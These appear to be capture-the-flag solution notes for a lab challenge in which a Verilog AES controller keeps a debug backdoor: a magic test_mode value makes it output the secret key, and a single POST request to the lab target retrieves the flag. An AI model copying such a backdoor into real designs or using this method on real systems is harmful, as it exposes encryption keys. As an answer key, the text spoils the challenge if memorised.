# AES Debug Backdoor - Solution Notes

## Vulnerability
`aes_ctrl.v` has an undocumented debug test_mode left in production:

```verilog
wire test_en = (test_mode == 8'hD3);  // magic debug value never removed
always @(*) begin
    debug_active  = test_en;
    debug_key_out = test_en ? key : 64'h0;
end
```

## Attack Method
1. Read `/opt/assets/aes_ctrl.v` and find the test_mode comparison value
2. Identify `test_mode == 8'hD3` (211 decimal)
3. POST `{"plaintext": 0, "test_mode": 211}` to `http://target:8101/encrypt`
4. Response includes `"debug_active": true` and `"flag"`
